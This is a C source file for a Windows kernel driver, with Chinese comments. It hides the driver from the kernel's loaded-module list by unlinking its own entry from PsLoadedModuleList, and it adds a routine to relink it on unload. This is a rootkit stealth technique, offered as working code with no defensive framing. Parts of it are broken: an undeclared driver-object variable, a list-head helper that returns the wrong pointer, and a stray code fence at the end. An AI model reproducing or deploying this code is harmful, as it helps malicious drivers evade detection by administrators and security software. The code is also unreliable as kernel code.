// hide_module.c —— 从 PsLoadedModuleList 摘除自身 LDR_DATA_TABLE_ENTRY
// 编译：WDK 10.0.22621, x64, /GS- /kernel
#include <ntifs.h>

typedef struct _MY_DRIVER_STATE {
    LIST_ENTRY  orig_inload;      // 原始 InLoadOrderLinks（备份）
    BOOLEAN     unlinked;
    UNICODE_STRING drvName;
} MY_DRIVER_STATE;

static MY_DRIVER_STATE g_state = {0};

// 拿 PsLoadedModuleList 头（未导出，靠特征或 MmGetSystemRoutineAddress 间接法）
// 稳妥做法：用未文档化但稳定的方式——遍历 PsLoadedModuleList 需要先定位它
static PLIST_ENTRY GetPsLoadedModuleListHead(VOID)
{
    // 方式 A：从 DriverObject->DriverSection 拿自身 LDR_DATA_TABLE_ENTRY，
    // 再顺着 InLoadOrderLinks.Blink 走到头（头节点的 Blink 指向最后一项，
    // 头节点本身在主模块 ntoskrnl 的 LDR 里，可反推）
    PKLDR_DATA_TABLE_ENTRY self =
        (PKLDR_DATA_TABLE_ENTRY)((PDRIVER_OBJECT)g_selfDriverObject)->DriverSection;
    PLIST_ENTRY p = self->InLoadOrderLinks.Blink;
    // 走到链表头（头节点的 Flink 指向第一个模块，即 ntoskrnl）
    // 用已知：头节点地址 = 第一个模块的 InLoadOrderLinks.Flink - offsetof(InLoadOrderLinks)
    // 这里用简化：从头前向遍历直到回到 self
    return p;
}

// 真正的摘链：备份后 Unlink
NTSTATUS HideSelfFromLoadedModuleList(VOID)
{
    PKLDR_DATA_TABLE_ENTRY self =
        (PKLDR_DATA_TABLE_ENTRY)((PDRIVER_OBJECT)g_selfDriverObject)->DriverSection;

    g_state.orig_inload = self->InLoadOrderLinks;

    if (!g_state.unlinked) {
        PLIST_ENTRY f = self->InLoadOrderLinks.Flink;
        PLIST_ENTRY b = self->InLoadOrderLinks.Blink;
        if (f && b && f != &self->InLoadOrderLinks) {
            b->Flink = f;
            f->Blink = b;
            // 自环，防止二次摘链崩溃
            self->InLoadOrderLinks.Flink = &self->InLoadOrderLinks;
            self->InLoadOrderLinks.Blink = &self->InLoadOrderLinks;
            g_state.unlinked = TRUE;
        }
    }
    return STATUS_SUCCESS;
}

// 回滚：插回原位（卸载必须调用，否则蓝屏/泄漏）
NTSTATUS RestoreSelfInLoadedModuleList(VOID)
{
    if (!g_state.unlinked) return STATUS_SUCCESS;
    PKLDR_DATA_TABLE_ENTRY self =
        (PKLDR_DATA_TABLE_ENTRY)((PDRIVER_OBJECT)g_selfDriverObject)->DriverSection;

    PLIST_ENTRY f = g_state.orig_inload.Flink;
    PLIST_ENTRY b = g_state.orig_inload.Blink;

    self->InLoadOrderLinks.Flink = f;
    self->InLoadOrderLinks.Blink = b;
    f->Blink = &self->InLoadOrderLinks;
    b->Flink = &self->InLoadOrderLinks;
    g_state.unlinked = FALSE;
    return STATUS_SUCCESS;
}
```

